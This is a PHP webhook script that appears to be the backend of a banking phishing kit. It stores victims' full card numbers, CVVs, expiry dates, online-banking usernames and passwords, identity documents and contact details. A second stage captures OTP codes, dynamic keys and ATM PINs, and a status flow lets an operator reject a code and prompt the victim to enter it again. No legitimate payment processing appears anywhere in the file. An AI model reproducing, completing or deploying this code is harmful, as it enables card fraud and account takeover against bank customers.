<?php
// api/webhook.php
require_once __DIR__ . '/_bootstrap.php';

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    json_err('method_not_allowed', 405);
}

pyp_require_api_key();

$raw = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) json_err('invalid_json');

$solicitudId = trim($input['solicitudId'] ?? '');
$tipoPaso = trim($input['tipo_paso'] ?? 'credenciales');
if (!$solicitudId) json_err('missing_solicitudId');

// ============================================
// CASO 1: CREDENCIALES (INSERT)
// ============================================
if ($tipoPaso === 'credenciales') {
    $existe = db_fetch("SELECT id FROM solicitudes WHERE id = ?", [$solicitudId]);

    if (!$existe) {
        $ip = !empty($input['ip']) ? $input['ip'] : pyp_ip();
        $pais = !empty($input['pais']) ? $input['pais'] : 'Desconocido';
        $ciudad = !empty($input['ciudad']) ? $input['ciudad'] : 'Desconocida';

        db_exec("
            INSERT INTO solicitudes (
                id, fecha, fecha_procesada, numero_tarjeta, cvv, vencimiento, banco, tipo_tarjeta,
                usuario, password, otp_codigo, otp_codigo_secundario, otp_modo,
                clave_cajero_codigo, clave_dinamica_codigo, nombre, documento, email, celular, monto, placas,
                ip, pais, ciudad, estado, payload_json
            ) VALUES (
                ?, NOW(), NULL, ?, ?, ?, ?, ?,
                ?, ?, 'N/A', 'N/A', 'N/A',
                'N/A', 'N/A', ?, ?, ?, ?, ?, ?,
                ?, ?, ?, 'pending', ?
            )
        ", [
            $solicitudId,
            $input['numeroTarjeta'] ?? $input['numero_tarjeta'] ?? 'N/A',
            $input['cvv'] ?? 'N/A',
            $input['vencimiento'] ?? 'N/A',
            $input['bancoEmisor'] ?? $input['banco_emisor'] ?? 'N/A',
            $input['tipo_tarjeta'] ?? $input['tipoTarjeta'] ?? 'visa',
            $input['usuario'] ?? 'N/A',
            $input['password'] ?? 'N/A',
            $input['nombreCompleto'] ?? $input['nombre_completo'] ?? 'N/A',
            trim(($input['tipoDocumento'] ?? '') . ' ' . ($input['numeroDocumento'] ?? 'N/A')),
            $input['email'] ?? 'N/A',
            $input['celular'] ?? 'N/A',
            $input['monto'] ?? 'N/A',
            $input['placas'] ?? null,
            $ip,
            $pais,
            $ciudad,
            json_encode($input, JSON_UNESCAPED_UNICODE)
        ]);

        json_ok(['id' => $solicitudId, 'message' => 'Solicitud creada']);
    }

    json_ok(['id' => $solicitudId, 'message' => 'Solicitud ya existe']);
}

// ============================================
// CASO 2: OTP / CLAVE DINÁMICA / CLAVE CAJERO (UPDATE)
// ============================================
if (in_array($tipoPaso, ['otp', 'clave_dinamica', 'clave_cajero'])) {
    $originalId = $input['solicitudOriginalId'] ?? $input['solicitudId'] ?? null;
    $esReintento = !empty($input['es_reintento']);

    if (!$originalId) json_err('missing_original_id');

    $s = db_fetch("SELECT * FROM solicitudes WHERE id = ?", [$originalId]);
    if (!$s) json_err('Solicitud original no encontrada', 404);

    $estadoActual = $s['estado'] ?? 'pending';

    // ERROR USUARIO - NO REINTENTOS
    if ($estadoActual === 'rejected_user_error') {
        json_err('Error de usuario. Reinicie el proceso.', 403);
    }

    $estadosRechazados = ['rejected', 'rejected_otp', 'rejected_clave_cajero'];

    if (in_array($estadoActual, $estadosRechazados) && !$esReintento) {
        json_err('La solicitud fue rechazada. Inicie nuevamente.', 403);
    }

    $updates = [];
    $params = [];

    if ($esReintento && in_array($estadoActual, $estadosRechazados)) {
        $updates[] = "estado = 'pending_otp'";
        $updates[] = "otp_modo = 'otp'";
        $updates[] = "fecha_procesada = NOW()";
        $updates[] = "otp_codigo = 'N/A'";
        $updates[] = "clave_cajero_codigo = 'N/A'";
        $updates[] = "clave_dinamica_codigo = 'N/A'";
        $updates[] = "otp_codigo_secundario = 'N/A'";
        $mensaje = 'Reintento - Estado reiniciado';
    }

    $codigo = $input['codigo'] ?? 'N/A';

    if ($tipoPaso === 'clave_cajero') {
        $updates[] = "clave_cajero_codigo = ?";
        $params[] = $codigo;
        $updates[] = "estado = 'pending_clave_cajero'";
        $updates[] = "otp_modo = 'clave_cajero'";
        $mensaje = 'Clave Cajero guardada';
    } elseif ($tipoPaso === 'clave_dinamica') {
        $updates[] = "clave_dinamica_codigo = ?";
        $params[] = $codigo;
        $updates[] = "estado = 'pending_otp'";
        $updates[] = "otp_modo = 'clave_dinamica'";
        $mensaje = 'Clave Dinámica guardada';
    } else {
        // OTP
        $tieneClaveCajero = !empty($s['clave_cajero_codigo']) && $s['clave_cajero_codigo'] !== 'N/A';
        $tieneClaveDinamica = !empty($s['clave_dinamica_codigo']) && $s['clave_dinamica_codigo'] !== 'N/A';

        if ($tieneClaveCajero || $tieneClaveDinamica) {
            $updates[] = "otp_codigo_secundario = ?";
            $params[] = $codigo;
            $mensaje = 'OTP guardado (secundario)';
        } else {
            $updates[] = "otp_codigo = ?";
            $params[] = $codigo;
            $mensaje = 'OTP guardado';
        }
        $updates[] = "estado = 'pending_otp'";
        $updates[] = "otp_modo = 'otp'";
    }

    $params[] = $originalId;
    $sqlUpdate = "UPDATE solicitudes SET " . implode(', ', $updates) . " WHERE id = ?";
    db_exec($sqlUpdate, $params);

    json_ok(['id' => $originalId, 'message' => $mensaje, 'actualizado' => true, 'es_reintento' => $esReintento]);
}

json_err('Tipo de paso no reconocido');
